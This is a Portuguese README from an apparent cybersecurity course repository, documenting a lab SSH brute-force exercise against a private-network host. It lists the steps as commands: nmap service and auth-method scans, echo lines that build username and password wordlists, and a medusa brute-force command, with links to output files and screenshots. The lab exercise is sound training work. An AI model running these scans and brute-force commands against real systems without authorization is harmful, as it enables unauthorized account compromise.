# SIMULANDO ATAQUE DE BRUTE FORCE
### Repositorio criado para compartilhar as evidencias do curso Santander - Cibersegurança 2025

1.	**Varredura de portas e versão do serviço**

`nmap -sV 192.168.200.20` <br/>

![Saída da varreadura realizada para identificação das portas abertas e as versões dos serviços em txt](/saidas_testes/varredura_portas_nmap.txt) <br/>

![Saída da varreadura realizada para identificação das portas abertas e as versões dos serviços](/img/varredura_portas_abertas.png) <br/>


2.	**Varredura na porta 22 com o script “ssh-auth-methods” para identificar os tipos de autenticação que o host permite**

`nmap -v -p22 --script=ssh-auth-methods -Pn 192.168.200.20` <br/>

![Saída da varreadura realizada para identificação dos tipos de autenticação permitido em txt](/saidas_testes/varredura_ssh-auth-mehtods.txt) <br/>

![Saída da varreadura realizada para identificação dos tipos de autenticação permitido](/img/varredura_ssh-auth-mehtods.png) <br/>

3.	**Criar listas de usuários e senhas**

`echo -e "user\nmsfadmin\nroot\nservice\nadmin\nsysadmin" > users.txt` <br/>
`echo -e "123456\npassword\nqwerty\nmsfadmin\nadmin\npass123\npasswd" > pass.txt` <br/>

4.	**Brute force ssh com wordlist**

`medusa -h 192.168.200.20 -U users.txt -P pass.txt -M ssh -t 6` <br/>

![Saída do teste brute force com medusa e wordlist em txt](/saidas_testes/brute_force_medusa.txt) <br/>

![Saída do teste brute force com medusa e wordlist](/img/test_user_pass_medusa.png) <br/>

![Teste de credenciais utilizando o putty](/img/test_ssh_port.png) <br/>
